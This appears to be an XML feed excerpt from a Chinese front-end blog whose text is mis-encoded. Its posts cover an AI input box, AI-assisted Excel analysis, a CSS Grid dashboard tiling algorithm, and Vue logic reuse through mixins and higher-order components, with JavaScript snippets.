      <url>/2025/02/13/%E5%A4%8D%E6%9D%82%E8%BE%93%E5%85%A5%E6%A1%86/</url>
      <content type="html"><![CDATA[<blockquote><p>AIéœ€æ±‚</p></blockquote><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.zhangxinxu.com/wordpress/2022/08/gitee-feishu-okr-at-mention/" target="_blank" rel="noopener">giteeä¸Šæ’¸äº†ä¸ªç±»ä¼¼é£ä¹¦OKRè¾“å…¥æ¡†çš„@æåŠé¡¹ç›®</a></li><li><a href="https://www.doubao.com/" target="_blank" rel="noopener">è±†åŒ…è¾“å…¥æ¡†</a></li><li><a href="https://juejin.cn/post/7433439452662382618?searchId=202502252211221A86262DE00536267AD5" target="_blank" rel="noopener">AI æ™ºèƒ½è¾“å…¥æ¡†è§£å†³æ–¹æ¡ˆã€å‰ç«¯ã€‘</a></li><li><a href="https://www.zhangxinxu.com/wordpress/2024/07/css-custom-highlight-api/" target="_blank" rel="noopener">ä»Šæ—¥å­¦ä¹ CSSæ–‡æœ¬è‡ªå®šä¹‰é«˜äº®API</a></li></ul>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ™ºèƒ½åˆ†æ - Antv G2 Plotæ•°æ®å¯è§†åŒ–</title>
      <link href="/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90-chart/"/>
      <url>/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90-chart/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ™ºèƒ½åˆ†æ</title>
      <link href="/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90/"/>
      <url>/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>æ™ºèƒ½åˆ†ææ˜¯åœ¨é€šç”¨åœºæ™¯ä¸‹ï¼Œé€šè¿‡æ•°æ®æ¸…æ´—ã€æ¨èåˆ†ææ–¹æ¡ˆã€å¿«é€Ÿç”Ÿæˆå›¾è¡¨çš„æŠ€æœ¯èƒ½åŠ›ï¼Œ<br>ä½¿ç”¨<em>æ•°å­¦æ–¹æ³•</em>ä¸ºç”¨æˆ·æä¾›ä¸€é”®åŒ–çš„æ•°æ®åˆ†æè§£å†³æ–¹æ¡ˆã€‚</p></blockquote><h3 id="1-ä¼ ç»Ÿå®ç°"><a href="#1-ä¼ ç»Ÿå®ç°" class="headerlink" title="1. ä¼ ç»Ÿå®ç°"></a>1. ä¼ ç»Ÿå®ç°</h3><p>ä¸€ä¸ªExcelè¡¨æ ¼ï¼Œè¦ç»Ÿè®¡æˆæ•°æ®æŠ¥è¡¨ï¼Œè¿è¥äººå‘˜éœ€è¦æ“ä½œè¿™å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li>ç­›é€‰æ•°æ®</li><li>ç»„ç»‡æ•°æ®é€è§†è¡¨</li><li>åˆ¶ä½œè¡¨æ ¼+å›¾è¡¨ã€æ€»ç»“ç»“è®º</li><li>æ•´ç†æˆæŠ¥å‘Š</li></ul><p>è€Œæ™ºèƒ½åˆ†æåˆ©ç”¨<em><code>AI + BI</code></em> å¯ä»¥ä¸ºç”¨æˆ·æä¾›ä¸€é”®åŒ–äº§å‡ºæ•°æ®åˆ†ææŠ¥å‘Šçš„å·¥å…·ã€‚<br><img src="/2025/02/11/æ™ºèƒ½åˆ†æ/1.png" style="margin: 10px"><br><br></p><h3 id="2-æ™ºèƒ½åˆ†æ"><a href="#2-æ™ºèƒ½åˆ†æ" class="headerlink" title="2. æ™ºèƒ½åˆ†æ"></a>2. æ™ºèƒ½åˆ†æ</h3><p>æ™ºèƒ½åˆ†æåŒ…å«è¡¨æ ¼ç»“æ„è¯†åˆ«ã€åˆ—ç±»å‹è¯†åˆ«ã€æ•°æ®æ ¡å¯¹ã€æ•°æ®æ¸…æ´—ã€å¤šç»´æ•°æ®åº“å»ºæ¨¡ã€æ ¹æ®æ•°æ®ç‰¹æ€§é€‰æ‹©åˆ†ææ–¹æ³•ã€æ¨èå›¾è¡¨ç±»å‹å’Œç»“è®ºã€æ•°æ®å¯è§†åŒ–ç­‰å¤šä¸ªæ¨¡å—ã€‚<br><img src="/2025/02/11/æ™ºèƒ½åˆ†æ/2.png"></p><p><br></p><h4 id="2-2-æ•°æ®æ¸…æ´—"><a href="#2-2-æ•°æ®æ¸…æ´—" class="headerlink" title="2.2 æ•°æ®æ¸…æ´—"></a>2.2 æ•°æ®æ¸…æ´—</h4><p>ç”¨æˆ·çš„Excelè¡¨æ ¼ä¸èƒ½ç›´æ¥æ‹¿æ¥åˆ†æï¼Œå®ƒä»¬çš„è¡¨å¤´å¾€å¾€å¤æ‚ã€ä¸è§„èŒƒï¼Œç”±å¤šè¡Œå•å…ƒæ ¼ç»„æˆã€‚<br>éœ€è¦è½¬ä¸ºæ–¹ä¾¿åˆ†æçš„æ•°æ®è¡¨ï¼Œè®©è¡¨ä¸­çš„æ¯åˆ—å‡æœ‰åˆ—åã€æ•°æ®ç±»å‹ã€å…·ä½“æ•°æ®ã€‚</p><ul><li>è¯†åˆ«ï¼šä¸€ä¸ªexcel sheeté‡Œå¯èƒ½ä¼šæœ‰å¤šä¸ªè¡¨æ ¼ï¼Œè¿™æ—¶éœ€è¦åˆ‡è¡¨ã€é€‰æ‹©éœ€è¦åˆ†æçš„è¡¨æ ¼</li><li>æ ¡å¯¹ï¼šè¯†åˆ«åˆ—ç±»å‹ã€æ ¡å¯¹ä¸æ­£ç¡®çš„æ•°æ®ï¼Œè®©è¡¨ä¸­çš„æ¯åˆ—å‡æœ‰åˆ—åã€æ•°æ®ç±»å‹ã€å…·ä½“æ•°æ®</li><li>æ¸…æ´—ï¼šåˆ é™¤ä¸éœ€è¦åˆ†æçš„è¡Œã€å¹³é“ºå•å…ƒæ ¼ï¼Œç”Ÿæˆæ•°æ®è¡¨</li></ul><p><em>æœ‰äº†æ•°æ®è¡¨ä¹‹åï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯ï¼Œå¦‚ä½•ç”Ÿæˆåˆ†æç»“æœï¼Ÿ</em><br><br></p><h4 id="2-2-æ•°æ®æŒ–æ˜"><a href="#2-2-æ•°æ®æŒ–æ˜" class="headerlink" title="2.2 æ•°æ®æŒ–æ˜"></a>2.2 æ•°æ®æŒ–æ˜</h4><p>æ•°æ®æŒ–æ˜æ˜¯æŒ‡ä»æ•°æ®åº“çš„å¤§é‡æ•°æ®ä¸­æ­ç¤ºå‡ºéšå«çš„ã€å…ˆå‰æœªçŸ¥çš„å¹¶æœ‰æ½œåœ¨ä»·å€¼çš„ä¿¡æ¯çš„éå¹³å‡¡è¿‡ç¨‹ã€‚</p><p>æˆ‘ä»¬æƒ³çŸ¥é“çš„å¾€å¾€æ˜¯ï¼Œ<em>è¡¨æ ¼å­—æ®µä¹‹é—´æ˜¯å¦æœ‰å…³ç³»ï¼Ÿ</em><br>è¿™æ—¶å¯ä»¥ï¼š</p><ul><li>å‡è®¾å­—æ®µä¹‹é—´å­˜åœ¨å…³ç³»</li><li>é€‰æ‹©åˆ†ææ–¹æ³•ï¼Œè¿›è¡Œæ£€éªŒ</li><li>å¾—å‡ºç»“è®º</li></ul><p><em>å°†è¿™ä¸ªæ­¥éª¤ï¼Œè½¬åŒ–ä¸ºæ•°å­¦é—®é¢˜ï¼Œå¹¶ç”¨æ•°å­¦æ–¹æ³•æ±‚è§£</em></p><ul><li>å‡è®¾å…³ç³»</li><li>æ£€éªŒï¼šåˆ†ææ–¹æ³•è½¬ä¸ºæ•°å­¦å…¬å¼ï¼Œæ±‚è§£ç»“æœ</li><li>æ ¹æ®æ±‚è§£ç»“æœ + åˆ†ææ–¹æ³•ï¼Œå¾—å‡ºæè¿°æ€§è¯­å¥</li></ul><p><br></p><h4 id="2-3-æ•°æ®å¯è§†åŒ–"><a href="#2-3-æ•°æ®å¯è§†åŒ–" class="headerlink" title="2.3 æ•°æ®å¯è§†åŒ–"></a>2.3 æ•°æ®å¯è§†åŒ–</h4><p>å¾—åˆ°æ±‚è§£ç»“æœã€æè¿°æ€§è¯­å¥åï¼Œç”Ÿæˆå›¾è¡¨ï¼Œè¿›è¡Œæ•°æ®å¯è§†åŒ–</p><p><img src="/2025/02/11/æ™ºèƒ½åˆ†æ/4.png"></p><p><br></p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ä»ªè¡¨ç›˜ç»˜åˆ¶æ–¹æ¡ˆ</title>
      <link href="/2025/02/11/%E6%95%B0%E6%8D%AE%E7%9C%8B%E6%9D%BF/"/>
      <url>/2025/02/11/%E6%95%B0%E6%8D%AE%E7%9C%8B%E6%9D%BF/</url>
      <content type="html"><![CDATA[<blockquote><p>æ ¹æ®Excelæ•°æ®ï¼Œä¸€é”®ç”Ÿæˆä»ªè¡¨ç›˜ã€‚</p></blockquote><p><br></p><h3 id="1-éœ€è¦è§£å†³çš„é—®é¢˜"><a href="#1-éœ€è¦è§£å†³çš„é—®é¢˜" class="headerlink" title="1. éœ€è¦è§£å†³çš„é—®é¢˜"></a>1. éœ€è¦è§£å†³çš„é—®é¢˜</h3><p>ä»ªè¡¨ç›˜ä¸­çš„æ¯ä¸ªå›¾è¡¨ã€å¡ç‰‡éƒ½æ˜¯ä¸€ä¸ªå°çŸ©å½¢ã€‚éœ€è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•å°†ä¸å®šé‡ã€ä¸å®šå¤§å°çš„å°çŸ©å½¢ï¼Œæ‹¼æˆä¸€ä¸ªå¤§çŸ©å½¢ï¼Ÿ<br><img src="/2025/02/11/æ•°æ®çœ‹æ¿/7.png" style="display: inline-block; width: 50%; margin: 14px 0"><img src="/2025/02/11/æ•°æ®çœ‹æ¿/8.png" style="display: inline-block; width: 50%;margin: 14px 0"></p><p><br></p><h4 id="1-1-å®šä¹‰å…ƒç´ "><a href="#1-1-å®šä¹‰å…ƒç´ " class="headerlink" title="1.1 å®šä¹‰å…ƒç´ "></a>1.1 å®šä¹‰å…ƒç´ </h4><p>ã€Step 1ã€‘åœ¨æ‹¼æˆä»ªè¡¨ç›˜å‰ï¼Œæˆ‘ä»¬å…ˆå®šä¹‰å›¾è¡¨çš„sizeã€‚<br>æ ¹æ®å›¾è¡¨çš„ç‰¹å¾ç±»å‹ï¼Œå›¾è¡¨çš„sizeä¼šè¢«æ ‡è®°æˆrect1, rect2, rect3ï¼Œå…·ä½“å®½é«˜å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="/2025/02/11/æ•°æ®çœ‹æ¿/1.png" style="margin: 10px auto 20px"></p><p><br></p><h4 id="1-2-æ‹†åˆ†å­ä»»åŠ¡"><a href="#1-2-æ‹†åˆ†å­ä»»åŠ¡" class="headerlink" title="1.2 æ‹†åˆ†å­ä»»åŠ¡"></a>1.2 æ‹†åˆ†å­ä»»åŠ¡</h4><p>ã€Step 2ã€‘å°†â€œæ‹¼æˆå¤§çŸ©å½¢â€œçš„ä»»åŠ¡ï¼Œæ‹†åˆ†æˆâ€œæ‹¼æˆä¸€è¡Œâ€œçš„å­ä»»åŠ¡ã€‚<br>æœ‰çš„ä»ªè¡¨ç›˜ä¸€è¡Œå¯ä»¥æ”¾2ä¸ªå…ƒç´ ï¼Œæœ‰çš„ä¸€è¡Œåˆ™å¯ä»¥æ”¾3ä¸ªå…ƒç´ ï¼Œç”šè‡³4ä¸ªã€‚æ ¹æ®ä¸€è¡Œå¯ä»¥æ”¾å‡ ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬åˆ—å‡º4ç§å¸ƒå±€ï¼š</p><ul><li>ä¸€åˆ—å¸ƒå±€: æ€»å®½350px</li><li>ä¸¤åˆ—å¸ƒå±€: æ€»å®½700px</li><li>ä¸‰åˆ—å¸ƒå±€: æ€»å®½900px</li><li>å››åˆ—å¸ƒå±€: æ€»å®½1200px<br>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨ä¸¤åˆ—å¸ƒå±€ä¸­,rect2å¯ä»¥å•ç‹¬æ‹¼æˆä¸€è¡Œï¼Œrect1 + rect1ä¹Ÿå¯ä»¥å•ç‹¬æ‹¼æˆä¸€è¡Œã€‚ä¸‹å›¾æ˜¯å¯ä»¥æ‹¼æˆä¸€è¡Œçš„æƒ…å†µçš„æ‰€æœ‰æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ä»ªè¡¨ç›˜çš„æ’åˆ—å¸ƒå±€ã€‚<br><img src="/2025/02/11/æ•°æ®çœ‹æ¿/2.png" style="margin: 10px "><br>ï¼ˆPSï¼šè¿™é‡Œä¼šå°†ä¸€è¡Œå½“æˆä¸€ä¸ªgrid-containerï¼Œè€Œä¸æ˜¯æ•´ä¸ªçŸ©å½¢å½“æˆä¸€ä¸ªgrid-containerã€‚ä¼˜ç‚¹ï¼šä¸åŒè¡Œçš„ä¹‹é—´çš„æœ€å°å•å…ƒæ ¼ä¸å¿…ä¸€æ ·ï¼‰<br>ç¬¬ä¸€æ­¥æˆ‘ä»¬å·²ç»å¾—åˆ°chartSizeï¼Œå‡è®¾ç°åœ¨æœ‰3ä¸ªå›¾è¡¨ï¼Œsizeåˆ†åˆ«ä¸º rect2, rect1, rect1çš„å°çŸ©å½¢ï¼Œå¥—å…¥2åˆ—å¸ƒå±€ï¼Œä¾æ¬¡çœ‹èƒ½ä¸èƒ½æ‹¼æˆä¸€è¡Œä¸€è¡Œã€‚å‘ç°rect2å¯ä»¥æ‹¼æˆä¸€è¡Œï¼Œrect1 + rect1å¯ä»¥æ‹¼æˆä¸€è¡Œï¼Œä¸”æ‹¼å®Œä¹‹åæ²¡æœ‰å…¶ä»–å…ƒç´ ï¼Œå³å¯ä»¥æ‹¼æˆå¤§çŸ©å½¢ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chartSize = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">const</span> PUZZLE_RULE = &#123;</span><br><span class="line">  <span class="number">2</span>: [<span class="string">'11'</span>, <span class="string">'2'</span>, <span class="string">'311'</span>],</span><br><span class="line">  <span class="number">3</span>: [<span class="string">'322'</span>, <span class="string">'3211'</span>, <span class="string">'31111'</span>, <span class="string">'21'</span>, <span class="string">'111'</span>],</span><br><span class="line">  <span class="number">4</span>: <span class="comment">// ...,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-3-ç¡®å®šæœ€ç»ˆä»»åŠ¡"><a href="#1-3-ç¡®å®šæœ€ç»ˆä»»åŠ¡" class="headerlink" title="1.3 ç¡®å®šæœ€ç»ˆä»»åŠ¡"></a>1.3 ç¡®å®šæœ€ç»ˆä»»åŠ¡</h4><p>ã€Step 3ã€‘ç¡®ä¿å¯ä»¥æ‹¼æˆçŸ©å½¢<br>ä½†æ˜¯ï¼Œå› ä¸ºå›¾è¡¨æ•°é‡ã€å¤§å°æ˜¯ä¸ç¡®å®šçš„ï¼Œå°†å®ƒä»¬å¥—å…¥xåˆ—å¸ƒå±€ä¸­ï¼Œå¾ˆå¤§æ¦‚ç‡ä¸èƒ½æ‹¼æˆä¸€ä¸ªçŸ©å½¢ã€‚<br>æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>é¢ç§¯ä¸å¯¹<br>è¦åœ¨2åˆ—å¸ƒå±€æ‹¼æˆçŸ©å½¢ï¼Œ å›¾è¡¨æ€»é¢ç§¯å¿…é¡»ä¸º2çš„å€æ•°ã€‚<br>å‡è®¾æœ‰3ä¸ªrect1å›¾è¡¨ï¼Œæ€»é¢ç§¯ä¸º3ï¼Œ3 % 2 = 1ï¼Œå³æ— æ³•æ‹¼æˆ</li><li>å›¾è¡¨é¡ºåºä¸å¯¹<br>ä¸ƒå·§æ¿ä¸€å®šè¦ç”¨æ­£ç¡®çš„æ‘†æ”¾é¡ºåºï¼Œæ‰èƒ½æ‹¼æˆçŸ©å½¢</li></ul><p><br></p><p><em>ä¸ºäº†ç¡®ä¿å¯ä»¥æ‹¼æˆçŸ©å½¢ï¼Œæˆ‘ä»¬å¯ä»¥</em></p><ul><li>æ”¹å˜é¢ç§¯ï¼šäººä¸ºå¢å¤§å›¾è¡¨é¢ç§¯ï¼ˆæ‹‰å®½æ‹‰é«˜ï¼‰<br>å‡è®¾xä¸ºæ€»é¢ç§¯ï¼Œè¦ä¿è¯<em><code>x % 2 == 0</code></em> &amp;&amp; <em><code>x % 3 == 0</code></em> &amp;&amp; <em><code>x % 4 == 0</code></em>ï¼Œå·²çŸ¥<em><code>x % 2, x % 3 ,x % 4</code></em>å¯èƒ½å‡ºç°çš„ä½™æ•°æ˜¯0,1,2,3ã€‚åªè¦æŠŠä½™æ•°è¡¥é½ï¼ŒåŸæ¥ä¸èƒ½è¢«2,3,4æ•´é™¤çš„xï¼Œå°±å¯ä»¥è¢«æ•´é™¤ã€‚<br>å³å°†<em><code>y = x || x+1 || x+2 || x+3</code></em>, yæ€»ä¼šæœ‰ä¸€ä¸ªæ•°èƒ½æ•´é™¤2, æ•´é™¤3, æ•´é™¤4ã€‚å› æ­¤å¢å¤§å›¾è¡¨é¢ç§¯ï¼Œèƒ½ç¡®ä¿1,2,3,4åˆ—å¸ƒå±€éƒ½æœ‰ä¸€ä¸ªå¯ä»¥æ‹¼æˆçš„ç»„åˆã€‚</li></ul><table><thead><tr><th>å¥—ç”¨å¸ƒå±€</th><th style="text-align:center">ä¸¤åˆ—å¸ƒå±€</th><th style="text-align:right">ä¸‰åˆ—å¸ƒå±€</th><th style="text-align:right">å››åˆ—å¸ƒå±€ </th></tr></thead><tbody><tr><td>x(å›¾è¡¨æ€»é¢ç§¯ x &gt;=2 )</td><td style="text-align:center">x%2</td><td style="text-align:right">x%3</td><td style="text-align:right">x%4 </td></tr><tr><td>å¯èƒ½å¾—ä½™æ•°</td><td style="text-align:center">0,1</td><td style="text-align:right">0,1,2</td><td style="text-align:right">0,1,2,3</td></tr><tr><td>å¢åŠ é¢ç§¯å¯¹ç­–</td><td style="text-align:center"><em><code>x+1</code></em></td><td style="text-align:right"><em><code>x+1, x+2</code></em></td><td style="text-align:right"><em><code>x+1, x+2, x+3</code></em></td></tr></tbody></table><p><br></p><p><em>æ±‚å…¨æ’åˆ—</em><br>ç©·ä¸¾æ‰€æœ‰æ’åˆ—ï¼Œæ£€æŸ¥æ˜¯å¦ç¬¦åˆæ‹¼æˆå¤§çŸ©å½¢ï¼Œåªè¦ç¬¦åˆå°±åœæ­¢æŸ¥æ‰¾ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾ä¸€å…±æœ‰3ä¸ªå›¾è¡¨ï¼Œå¤§å°åˆ†åˆ«æ˜¯rect-1, rect-2, rect-1</span></span><br><span class="line"><span class="keyword">const</span> chartSize = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¨æ’åˆ—</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">[<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‡è®¾æ˜¯äºŒåˆ—å¸ƒå±€</span></span><br><span class="line"><span class="comment"> * 1,1 å¯ä»¥æ˜¯ä¸€è¡Œ</span></span><br><span class="line"><span class="comment"> * 2 å¯ä»¥æ˜¯ä¸€è¡Œ</span></span><br><span class="line"><span class="comment"> * æ»¡è¶³æ¡ä»¶ï¼Œè¾“å‡º [1,1,2]</span></span><br><span class="line"><span class="comment"> * /</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-4-ç”Ÿæˆcss"><a href="#1-4-ç”Ÿæˆcss" class="headerlink" title="1.4 ç”Ÿæˆcss"></a>1.4 ç”Ÿæˆcss</h4><p>ã€Step 4ã€‘ ç”Ÿæˆcssæ ·å¼<br>æ‰¾åˆ°äº†æ‹¼æˆçš„ç»“æœï¼Œæˆ‘ä»¬çŸ¥é“æ˜¯å‡ åˆ—å¸ƒå±€ï¼Œæ¯ä¸€è¡Œæœ‰å“ªäº›å›¾è¡¨ï¼Œæ¯ä¸ªå›¾è¡¨çš„sizeã€‚<br>æ ¹æ®CSS Grid å¸ƒå±€ï¼Œå°†ç½‘é¡µåˆ’åˆ†æˆç½‘æ ¼ï¼ŒæŒ‡å®šå…ƒç´ æ¨ªè·¨å¤šä¸ªç½‘æ ¼ã€ç«–è·¨å‡ ä¸ªç½‘æ ¼ï¼Œå°±å¯ä»¥åœ¨é¡µé¢ä¸Šç»˜åˆ¶å‡ºä»ªè¡¨ç›˜äº†ã€‚<br><img src="/2025/02/11/æ•°æ®çœ‹æ¿/3.png" style="display: inline-block; height:300px"><img src="/2025/02/11/æ•°æ®çœ‹æ¿/4.png" style="display: inline-block; height:300px"><img src="/2025/02/11/æ•°æ®çœ‹æ¿/5.png" style="display: inline-block; height:300px"><img src="/2025/02/11/æ•°æ®çœ‹æ¿/6.png" style="display: inline-block; height:300px"></p><h3 id="2-ä»£ç "><a href="#2-ä»£ç " class="headerlink" title="2. ä»£ç "></a>2. ä»£ç </h3><p>ğŸ˜‚ç¦»èŒçš„æ—¶å€™å¿˜è®°æ‹·è¿™ä»½ä»£ç äº†hhhï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæ±‚å…¨æ’åˆ—çš„ç®—æ³•é¢˜</p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” é€»è¾‘å¤ç”¨èŒƒå¼ - ä» mixinã€é«˜é˜¶ç»„ä»¶åˆ° Hooks</title>
      <link href="/2025/02/05/Vue-%E9%80%BB%E8%BE%91%E5%A4%8D%E7%94%A8/"/>
      <url>/2025/02/05/Vue-%E9%80%BB%E8%BE%91%E5%A4%8D%E7%94%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡è®°å½•ã€ŠBç«™Â·è·Ÿå°¤é›¨æºªä¸€èµ·è§£è¯»Vue3æºç ã€‹ä¸­ï¼Œå°¤é›¨æºªå¯¹äºé€»è¾‘å¤ç”¨æ¼”åŒ–è¿‡ç¨‹çš„è®²è§£</p></blockquote><p>å‡è®¾æˆ‘ä»¬æœ‰è¿™ä¹ˆä¸€ä¸ªç»„ä»¶ï¼Œåœ¨é¡µé¢ä¸Šæ˜¾ç¤º<code>[x, y]</code>åæ ‡, <code>[x, y]</code>ä¼šéšç€é¼ æ ‡ç§»åŠ¨è€Œå˜åŒ–ã€‚ä»£ç ä¼šæ˜¯è¿™æ ·çš„ğŸ‘‡ğŸ»</p><p><em>æˆ‘ä»¬æƒ³æŠŠè¿™æ®µé€»è¾‘æŠ½å–å‡ºæ¥ï¼Œå¤ç”¨ï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•ï¼Ÿ</em><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="1-mixin"><a href="#1-mixin" class="headerlink" title="1. mixin"></a>1. mixin</h3><p>ç¬¬ä¸€ç§æ–¹æ³•<code>mixin</code>ã€‚æå–mixinå¾ˆå®¹æ˜“ï¼ŒæŠŠæ•°æ®å’Œé€»è¾‘æå–å‡ºæ¥ï¼Œæ”¾å…¥<code>mixins</code>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MouseMixin = &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  mixins: [MouseMixin],</span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯å¦‚æœä½ æœ‰å¾ˆå¤šä¸ªmixinï¼Œä¼šå‡ºç°è¿™äº›é—®é¢˜ï¼š</p><ul><li>æ³¨å…¥æºä¸æ˜ï¼šä¸çŸ¥é“å±æ€§ã€æ–¹æ³•æ¥è‡ªå“ªä¸ªmixin</li><li>å‘½åå†²çª<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  mixins: [MouseMixin, mixinA, mixinB, mixnC], <span class="comment">// å­˜åœ¨å¤šä¸ªmixinæ—¶ï¼Œä¼šå¾ˆæ··ä¹±</span></span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-é«˜é˜¶ç»„ä»¶"><a href="#2-é«˜é˜¶ç»„ä»¶" class="headerlink" title="2. é«˜é˜¶ç»„ä»¶"></a>2. é«˜é˜¶ç»„ä»¶</h3><p>å› ä¸ºmixinçš„ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼ŒReactåœ¨å¾ˆæ—©çš„æ—¶å€™å°±ç§»é™¤äº†Mixinã€‚<br>ä½†æ˜¯é¢å¯¹é€»è¾‘å¤ç”¨ï¼Œåˆæ²¡æœ‰å¾ˆå¥½çš„è§£å†³æ–¹æ³•ï¼Œäºæ˜¯æå‡ºæ¥äº†é«˜é˜¶ç»„ä»¶ã€‚</p><p>é«˜é˜¶ç»„ä»¶çš„ç”¨æ³•ï¼š</p><p>é«˜é˜¶ç»„ä»¶åŒ…å«äº†é€»è¾‘å¤ç”¨çš„å˜é‡å’Œæ–¹æ³•ï¼Œå¹¶åŒ…è£¹ä½ Inner ç»„ä»¶ï¼ŒåŒæ—¶æŠŠ<code>x,y</code>ä½œä¸º<code>props</code>ä¼ 